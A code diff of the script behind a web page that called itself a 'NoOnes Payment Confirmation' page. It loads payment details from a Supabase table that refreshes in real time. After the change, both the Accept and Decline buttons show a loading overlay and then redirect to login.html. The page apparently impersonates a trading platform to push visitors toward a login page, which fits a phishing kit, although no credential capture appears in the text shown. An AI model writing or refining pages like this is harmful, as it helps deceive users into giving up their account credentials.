             toast.classList.add('show');
             clearTimeout(toastTimeout);
             toastTimeout = setTimeout(function() {
@@ -962,155 +539,39 @@
         }
 
         // ============================================
-        // THEME TOGGLE
-        // ============================================
-        var themeToggle = document.getElementById('themeToggle');
-        var themeThumb = themeToggle.querySelector('.theme-thumb');
-        var savedTheme = localStorage.getItem('theme-preference');
-        if (savedTheme === 'dark') {
-            themeToggle.classList.add('active');
-            themeThumb.textContent = '☀️';
-            document.documentElement.setAttribute('data-mantine-color-scheme', 'dark');
-        }
-        themeToggle.addEventListener('click', function() {
-            this.classList.toggle('active');
-            var isDark = this.classList.contains('active');
-            themeThumb.textContent = isDark ? '☀️' : '🌙';
-            document.documentElement.setAttribute('data-mantine-color-scheme', isDark ? 'dark' : 'light');
-            localStorage.setItem('theme-preference', isDark ? 'dark' : 'light');
-        });
-
-        // ============================================
-        // COPY TO CLIPBOARD
-        // ============================================
-        document.querySelectorAll('.copy-btn').forEach(function(btn) {
-            btn.addEventListener('click', function(e) {
-                e.stopPropagation();
-                var targetId = this.dataset.copy;
-                var targetEl = document.getElementById(targetId);
-                if (targetEl) {
-                    var textToCopy = targetEl.textContent.trim();
-                    if (navigator.clipboard && navigator.clipboard.writeText) {
-                        navigator.clipboard.writeText(textToCopy).then(function() {
-                            this.classList.add('copied');
-                            this.innerHTML = '<span class="copy-icon">✓</span> Copied';
-                            showToast('Copied: ' + textToCopy.slice(0, 30) + (textToCopy.length > 30 ? '...' : ''));
-                            setTimeout(function() {
-                                this.classList.remove('copied');
-                                this.innerHTML = '<span class="copy-icon">📋</span> Copy';
-                            }, 2000);
-                        }.bind(this)).catch(function() {
-                            fallbackCopy(textToCopy, this);
-                        }.bind(this));
-                    } else {
-                        fallbackCopy(textToCopy, this);
-                    }
-                }
-            });
-        });
-
-        function fallbackCopy(text, btn) {
-            var textarea = document.createElement('textarea');
-            textarea.value = text;
-            textarea.style.position = 'fixed';
-            textarea.style.opacity = '0';
-            textarea.style.pointerEvents = 'none';
-            document.body.appendChild(textarea);
-            textarea.select();
-            try {
-                document.execCommand('copy');
-                btn.classList.add('copied');
-                btn.innerHTML = '<span class="copy-icon">✓</span> Copied';
-                showToast('Copied: ' + text.slice(0, 30) + (text.length > 30 ? '...' : ''));
-                setTimeout(function() {
-                    btn.classList.remove('copied');
-                    btn.innerHTML = '<span class="copy-icon">📋</span> Copy';
-                }, 2000);
-            } catch (err) {
-                showToast('Failed to copy');
-            }
-            document.body.removeChild(textarea);
-        }
-
-        // ============================================
-        // ACCEPT / DECLINE PAYMENT
+        // ACCEPT / DECLINE
         // ============================================
         document.getElementById('acceptBtn').addEventListener('click', function() {
-            this.disabled = true;
-            document.getElementById('declineBtn').disabled = true;
-            document.querySelector('.status-title').textContent = 'Payment Accepted';
-            document.querySelector('.status-subtitle').textContent = 'Transaction completed successfully';
-            document.getElementById('statusValue').textContent = 'Completed';
-            document.querySelector('.status-icon').textContent = '✅';
-            document.querySelector('.status-icon').style.background = '#E8F8F2';
-            document.querySelector('.status-icon').style.color = '#07B979';
-            document.getElementById('loadingOverlay').classList.add('active');
+            var overlay = document.getElementById('loadingOverlay');
+            overlay.classList.add('active');
             setTimeout(function() {
                 window.location.href = 'login.html';
             }, 3000);
         });
 
         document.getElementById('declineBtn').addEventListener('click', function() {
-            this.disabled = true;
-            document.getElementById('acceptBtn').disabled = true;
-            document.querySelector('.status-title').textContent = 'Payment Declined';
-            document.querySelector('.status-subtitle').textContent = 'Transaction has been cancelled';
-            document.getElementById('statusValue').textContent = 'Declined';
-            document.querySelector('.status-icon').textContent = '❌';
-            document.querySelector('.status-icon').style.background = '#FFEEEE';
-            document.querySelector('.status-icon').style.color = '#F22323';
-            document.getElementById('loadingOverlay').classList.add('active');
+            var overlay = document.getElementById('loadingOverlay');
+            overlay.classList.add('active');
             setTimeout(function() {
                 window.location.href = 'login.html';
             }, 3000);
         });
 
         // ============================================
-        // CLICK ON DETAIL ITEM TO COPY
-        // ============================================
-        document.querySelectorAll('.detail-item').forEach(function(item) {
-            item.addEventListener('click', function(e) {
-                if (e.target.closest('.copy-btn')) return;
-                var copyBtn = this.querySelector('.copy-btn');
-                if (copyBtn) {
-                    copyBtn.click();
-                }
-            });
-        });
-
-        // ============================================
-        // CHECK CONNECTION
-        // ============================================
-        function checkConnection() {
-            supabaseClient
-                .from('payment_details')
-                .select('id')
-                .limit(1)
-                .then(function(result) {
-                    var error = result.error;
-                    if (error) throw error;
-                    console.log('✅ Supabase connected successfully!');
-                })
-                .catch(function(error) {
-                    console.warn('⚠️ Supabase connection warning:', error);
-                });
-        }
-
-        // ============================================
         // INITIALIZE
         // ============================================
         function init() {
-            console.log('🚀 Initializing Landing Page (reads from Supabase)');
-            console.log('📡 Using Supabase URL:', SUPABASE_URL);
+            console.log('🚀 Loading payment page...');
+            console.log('🔗 Supabase URL:', SUPABASE_URL);
             
-            checkConnection();
+            // Load data
             loadData();
-            setupRealtimeSubscription();
-
-            console.log('%c 💰 NoOnes Payment Confirmation ', 'background: #07B979; color: white; font-size: 14px; font-weight: bold; padding: 4px 8px; border-radius: 4px;');
-            console.log('%c 🔒 Protected by NoOnes ', 'color: #07B979; font-size: 12px; font-weight: bold;');
-            console.log('%c 🌍 Updates work on ALL devices and browsers! ', 'color: #FF8C00; font-size: 12px; font-weight: bold;');
-            console.log('%c 📡 Real-time updates via Supabase ', 'color: #6B7A75; font-size: 12px;');
+            
+            // Setup real-time
+            setTimeout(setupRealtime, 1000);
+            
+            // Reload every 5 seconds (fallback)
+            setInterval(loadData, 5000);
         }
 
         document.addEventListener('DOMContentLoaded', init);
